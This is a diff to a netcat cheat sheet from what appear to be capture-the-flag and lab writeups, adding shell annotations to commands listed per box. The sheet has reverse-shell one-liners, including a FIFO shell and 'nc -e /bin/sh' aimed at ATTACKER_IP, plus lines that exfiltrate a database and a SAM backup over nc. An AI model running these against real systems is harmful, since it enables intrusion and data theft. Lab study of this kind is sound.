@@ -5,18 +5,21 @@ Swiss-army knife for TCP/UDP connections. In these writeups, primarily used as a
 ## Commands Used
 
 ### Listen for reverse shell
+<!-- cmd: linux -->
 ```bash
 nc -lvnp 443
 ```
 Used on: **Internal**
 
 ### Wrap listener with rlwrap for stable prompt
+<!-- cmd: linux -->
 ```bash
 rlwrap nc -lvnp 4444
 ```
 Used on: **Wreath**
 
 ### Receive exfiltrated file
+<!-- cmd: linux -->
 ```bash
 nc -lvnp 4444 > sam.bak
 ```
@@ -25,6 +28,7 @@ Used on: **Wreath**
 
 
 ### Listen for an LDAP callback test
+<!-- cmd: linux -->
 ```bash
 nc -lvp 389
 ```
@@ -32,6 +36,7 @@ Used on: **Breaching Active Directory**
 
 confirmed the printer could reach the attacker on LDAP before building the rogue LDAP server.
 ### Start a listener
+<!-- cmd: linux -->
 ```bash
 nc -lvnp 4444
 ```
@@ -43,24 +48,28 @@ Used on: **Kobold**, **Silentium**, **CCTV**, **DevArea**
 - `-p` — port number
 
 ### FIFO-based reverse shell (Alpine with limited `nc`)
+<!-- cmd: linux -->
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
 ```
 Used on: **Silentium** (Flowise MCP payload)
 
 ### Classic `-e` reverse shell
+<!-- cmd: linux -->
 ```bash
 nc -e /bin/sh ATTACKER_IP PORT
 ```
 Used on: **Silentium**, **CCTV**
 
 ### Reverse shell from inside Docker via exec
+<!-- cmd: linux -->
 ```bash
 nc ATTACKER_IP 5555 -e /bin/sh
 ```
 Used on: **MonitorsFour**
 
 ### Windows reverse shell via staged `nc.exe`
+<!-- cmd: linux -->
 ```bash
 # Attacker — host the binary
 cp /usr/share/windows-binaries/nc.exe .
@@ -78,6 +87,7 @@ delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-ex
 
 
 ### Listeners for PHP/JSP reverse shells
+<!-- cmd: linux -->
 ```bash
 nc -nlvp 8080
 nc -lvnp 4444
@@ -89,6 +99,7 @@ Used on: **bsidesgtdav**, **bsidesgtthompson**, **coldvvars**
 listeners for PHP WebDAV shell, JSP WAR shell, uploaded PHP shell, and the secondary `:!bash` shell.
 
 ### Connect to a network appliance VTY line
+<!-- cmd: linux -->
 ```bash
 nc -v $TARGET 2623
 ```
@@ -100,6 +111,7 @@ opened the FRRouting VTY console to fingerprint the banner, authenticate, and tr
 - Port `2623` is FRR's default VTY; classic IOS uses `23` (telnet)
 
 ### Connect to Asterisk AMI
+<!-- cmd: linux -->
 ```bash
 nc $TARGET 5038
 ACTION: login
@@ -111,6 +123,7 @@ Used on: **Aster**
 logged into Asterisk Manager Interface after Hydra recovered the AMI secret.
 
 ### Transfer files over raw TCP
+<!-- cmd: linux -->
 ```bash
 # Receiver
 nc -lvnp 4444 > uid_checker
@@ -122,6 +135,7 @@ Used on: **davesblog**
 
 copied the sudo-allowed `/uid_checker` binary back to Kali for reversing.
 
+<!-- cmd: linux -->
 ```bash
 # Sender
 nc ATTACKER_IP 80 < /opt/reactorwatch/reactor.db
@@ -134,6 +148,7 @@ Used on: **Reactor**
 exfiltrated an SQLite database for offline analysis.
 
 ### DevHub reverse-shell listeners
+<!-- cmd: linux -->
 ```bash
 nc -lvnp 4444
 nc -lvnp 5555
